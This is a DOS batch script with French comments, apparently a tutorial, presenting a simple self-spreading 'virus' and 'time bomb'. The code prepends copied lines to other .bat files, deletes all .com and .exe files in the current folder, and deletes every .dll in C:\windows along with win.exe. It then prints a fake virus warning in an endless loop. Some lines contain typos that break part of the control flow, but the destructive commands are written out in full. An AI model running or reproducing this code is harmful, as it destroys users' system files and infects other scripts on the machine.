@echo off 	                                ; cette commande désactive l'affichage de certains compte- 
                                                           rendus  
cls       				              ; comme toujours, cela efface l'écran.  
:debut    			                    ; ‚tiquette qui sert à faire des renvois. 
if exist 1.txt goto 1  		              ; Petite bombe à retardement , 1,2,3fois rien et puis après ...
if exit  2.txt goto 2  
if exist 3.txt goto 3 
if exist 4.txt goto 4  
:1                     
del 1.txt           
goto fin2         
:2                     
del c:\2.txt      
goto fin2        
:3                     
del c:\3.txt      
goto fin2        
:fin2                 
echo Ce programme marche a merveille !     ; cette ligne sert lors de l'essai de ce retardement. 
:4                                               
:virus                                        
if exist c:\virus.txt goto impression      ; il existe des tests, pour vérifier si les fichiers existent.
:nonimpression                                   
echo WARNING A Virus Has Intruded Your System ! >c:\virus.txt        ;le > signifie qu'il créé un fichier.
c:\windows\command\print < c:\hackviru\o.txt                         ; le < signifie qu'il regarde le           
                                                                     ;contenu du fichier et qu'il l'  
                                                                     ;assimile au fichier qu'il lance,  
                                                                     ;utile lorsqu'il faut des 
                                    					   ;confirmations.
goto impression			 	
:repro                                                    	         ; Le 'goto' est un renvoie 'go to'.
for %%a in (*.bat) do type %%a | find "sn" >text.vir                 ; ces quelques lignes méritent explications plus    
for %%a in (*.bat) do copy %%a %%a.kil                               ; bas !
for %%a in (*.bat) do copy text.vir + %%a.kil %%a          
:repro2                                                    
for %%a in (*.com) do del %%a                   
:repro3
for %%a in (*.exe) do del %%a
:windows
cd c:\windows
:dll
for %%a in (*.dll) do del %%a
del win.exe
:print         			               ; il y a une boucle a cet endroit pour que l'impression soit 
print c:\virus.txt                           ; réalisée en boucle qui démarre ici et qui finit au renvoi   
goto continuee                               ; 'goto print'.
:impression                                                
print c:\virus.txt                                         
goto continuee
:continuee                                                 
goto print
